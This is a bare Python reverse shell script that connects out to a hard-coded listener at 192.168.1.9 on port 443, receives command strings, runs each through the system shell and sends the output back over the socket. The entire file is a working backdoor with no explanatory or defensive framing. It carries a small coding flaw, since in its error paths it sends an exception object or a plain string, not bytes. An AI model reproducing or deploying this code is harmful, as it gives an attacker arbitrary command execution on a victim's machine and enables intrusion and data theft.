import socket
import subprocess

LHOST = "192.168.1.9"
LPORT = 443
BUFFER_SIZE = 1024

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((LHOST,LPORT))

while True:
    try:
        data = client.recv(BUFFER_SIZE)
        if not data:
            break
        code = data.decode("utf-8").strip()
        
        if len(code) > 1:
            try:
                output = subprocess.check_output(code, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as error:
                output = error
                
            client.send(output)
    except Exception as error:
        client.send(f"Error {error}") 
        
client.close()                           